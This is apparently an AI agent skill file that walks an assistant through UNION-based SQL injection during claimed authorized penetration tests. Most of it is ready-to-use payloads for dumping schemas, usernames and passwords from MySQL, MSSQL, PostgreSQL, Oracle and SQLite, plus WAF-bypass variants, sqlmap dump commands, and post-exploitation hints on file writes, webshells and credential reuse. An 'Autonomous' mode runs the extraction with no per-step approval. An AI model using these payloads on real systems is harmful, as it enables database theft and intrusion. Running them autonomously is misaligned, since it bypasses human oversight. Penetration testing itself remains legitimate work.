---
name: sql-injection-union
description: >
  Guide UNION-based SQL injection exploitation during authorized penetration
  testing. Use when the user has a SQL injection point where query results are
  rendered in the HTTP response, or when UNION-based extraction is suggested by
  another skill. Also triggers on: "UNION SELECT", "union injection", "column
  count", "ORDER BY injection", "data in the response", "query output visible",
  "displayed columns". OPSEC: medium — UNION and information_schema references
  appear in logs. Tools: sqlmap, burpsuite.
  Do NOT use when query output is not visible in the response — use
  sql-injection-error or sql-injection-blind instead.
---

# UNION-Based SQL Injection

You are helping a penetration tester exploit UNION-based SQL injection. The
target application renders query results in the HTTP response, allowing direct
data extraction by appending UNION SELECT. This is the fastest SQLi extraction
technique when it works. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Auto-determine column count, find displayed
  columns, detect DBMS, extract data progressively. Report extracted data at
  milestones. Only pause before destructive actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  data extracted, finding discovered, pivot to another skill):
  `### [HH:MM] sql-injection-union → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `sqli-union-schema-dump.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

After completing this technique or at significant milestones, update
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Confirmed SQL injection point (see **web-discovery**)
- Query output rendered somewhere in the HTTP response
- UNION keyword not blocked by WAF (if blocked, try **sql-injection-error** or **sql-injection-blind**)

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **Injection point** — URL, parameter name, request method
2. **Response behavior** — does query output appear in the page?
3. **DBMS** — if known from error messages or prior testing

Skip if context was already provided.

## Step 2: Determine Column Count

Two methods — try both, use whichever succeeds.

**ORDER BY method** — increment until error:
```sql
' ORDER BY 1--+        -- OK
' ORDER BY 2--+        -- OK
' ORDER BY 3--+        -- OK
' ORDER BY 4--+        -- ERROR -> 3 columns
```

**UNION SELECT NULL method** — increment NULLs until no error:
```sql
' UNION SELECT NULL--+                 -- ERROR
' UNION SELECT NULL,NULL--+            -- ERROR
' UNION SELECT NULL,NULL,NULL--+       -- OK -> 3 columns
```

## Step 3: Find Displayed Columns

Replace NULLs one at a time with a visible marker:
```sql
' UNION SELECT 'AAA',NULL,NULL--+
' UNION SELECT NULL,'BBB',NULL--+
' UNION SELECT NULL,NULL,'CCC'--+
```
Look for `AAA`, `BBB`, or `CCC` in the response. Those column positions are your extraction points.

## Step 4: Identify DBMS

If not already known, inject version functions in a displayed column:
```sql
' UNION SELECT version(),NULL,NULL--+          -- MySQL / PostgreSQL
' UNION SELECT @@version,NULL,NULL--+          -- MSSQL
' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--+ -- Oracle
' UNION SELECT sqlite_version(),NULL,NULL--+   -- SQLite
```

## Step 5: Extract Data

### MySQL

```sql
-- Current user and database
' UNION SELECT user(),database(),NULL--+

-- List all databases
' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--+

-- List tables in target database
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='TARGET_DB'--+

-- List columns in target table
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM TARGET_DB.TARGET_TABLE--+
```

**Dump In One Shot (DIOS)**:
```sql
' UNION SELECT CONCAT('~',(SELECT GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR 0x0a) FROM information_schema.columns WHERE table_schema=database())),NULL,NULL--+
```

**Without information_schema** (when blocked by WAF):
```sql
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM mysql.innodb_table_stats WHERE database_name=database()--+
```

### MSSQL

```sql
-- Current user and database
' UNION SELECT SYSTEM_USER,DB_NAME(),NULL--+

-- List all databases
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM master..sysdatabases--+

-- List tables in current database
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sysobjects WHERE xtype='U'--+

-- List columns in target table
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('TARGET_TABLE')--+

-- Extract data
' UNION SELECT STRING_AGG(username+':'+password,','),NULL,NULL FROM TARGET_TABLE--+

-- FOR JSON extraction (full table as JSON)
' UNION SELECT (SELECT * FROM TARGET_TABLE FOR JSON AUTO),NULL,NULL--+
```

**Iterate databases** when STRING_AGG unavailable (older MSSQL):
```sql
' UNION SELECT DB_NAME(0),NULL,NULL--+
' UNION SELECT DB_NAME(1),NULL,NULL--+
```

### PostgreSQL

```sql
-- Current user and database
' UNION SELECT current_user,current_database(),NULL--+

-- List all databases
' UNION SELECT STRING_AGG(datname,','),NULL,NULL FROM pg_database--+

-- List tables in public schema
' UNION SELECT STRING_AGG(tablename,','),NULL,NULL FROM pg_tables WHERE schemaname='public'--+

-- List columns in target table
' UNION SELECT STRING_AGG(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT STRING_AGG(username||':'||password,','),NULL,NULL FROM TARGET_TABLE--+

-- XML helper — dump entire table in one query
' UNION SELECT query_to_xml('SELECT * FROM TARGET_TABLE',true,false,'')::text,NULL,NULL--+
```

### Oracle

Oracle requires `FROM dual` for every SELECT without a table. Use `ROWNUM` instead of `LIMIT`.

```sql
-- Current user
' UNION SELECT user,global_name,NULL FROM global_name--+

-- List tables
' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL,NULL FROM user_tables--+

-- List columns
' UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id),NULL,NULL FROM all_tab_columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM TARGET_TABLE--+
```

**Without LISTAGG** (Oracle < 11.2):
```sql
' UNION SELECT RTRIM(XMLAGG(XMLELEMENT(e,table_name||',').EXTRACT('//text()') ORDER BY table_name).GetClobVal(),','),NULL,NULL FROM user_tables--+
```

### SQLite

```sql
-- Version
' UNION SELECT sqlite_version(),NULL,NULL--+

-- List all tables
' UNION SELECT GROUP_CONCAT(tbl_name),NULL,NULL FROM sqlite_master WHERE type='table'--+

-- List columns (uses pragma)
' UNION SELECT GROUP_CONCAT(name),NULL,NULL FROM pragma_table_info('TARGET_TABLE')--+

-- Extract data
' UNION SELECT GROUP_CONCAT(username||':'||password),NULL,NULL FROM TARGET_TABLE--+
```

## Step 6: Post-Exploitation

After extracting credentials or sensitive data:
1. **File read** — MySQL `LOAD_FILE()`, MSSQL `OPENROWSET BULK`, PostgreSQL `pg_read_file()`
2. **File write** — MySQL `INTO OUTFILE`, SQLite `ATTACH DATABASE`
3. **Command execution** — route to **sql-injection-stacked**
4. **Credential reuse** — test against SSH, RDP, admin panels

## Step 7: Escalate or Pivot

- **Need command execution**: Route to **sql-injection-stacked**
- **UNION blocked by WAF**: Route to **sql-injection-error** or **sql-injection-blind**
- **No visible output**: Route to **sql-injection-error** (if errors visible) or **sql-injection-blind**
- **Extracted credentials**: Test against other services, document findings

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: injection point, DBMS, column count, current mode, and payloads that worked.

## OPSEC Notes

- UNION SELECT is read-only — no database artifacts to clean up
- `UNION`, `information_schema`, `GROUP_CONCAT`/`STRING_AGG`/`LISTAGG` appear in web logs
- Anomalous response sizes from large data dumps may trigger alerts
- If you wrote files (webshells via INTO OUTFILE), remove them after use

## Troubleshooting

### UNION Blocked by WAF
```sql
-- Case variations
' UnIoN SeLeCt NULL,NULL,NULL--+

-- Inline comments (MySQL)
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL--+

-- Double URL encoding
%252f%252a*/UNION%252f%252a*/SELECT

-- UNION ALL instead of UNION
' UNION ALL SELECT NULL,NULL,NULL--+
```

### Column Type Mismatch
If `UNION SELECT 'string',NULL,NULL` fails, the column might be numeric:
```sql
' UNION SELECT 1,2,3--+
' UNION SELECT CAST(user() AS UNSIGNED),NULL,NULL--+
```

### No Visible Output
Query executes but data doesn't appear in the response:
- Try different column positions
- Wrap in HTML comment: `' UNION SELECT CONCAT('<!--',user(),'-->'),NULL,NULL--+`
- Switch to **sql-injection-error** or **sql-injection-blind**

### Automated Extraction with sqlmap
```bash
# Basic UNION extraction
sqlmap -u "https://TARGET/page?id=1" --batch --technique=U --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=U --dbs

# Dump specific table
sqlmap -r request.txt --batch -D TARGET_DB -T TARGET_TABLE --dump

# With tamper scripts for WAF bypass
sqlmap -r request.txt --batch --tamper=space2comment,between --technique=U --dbs
```
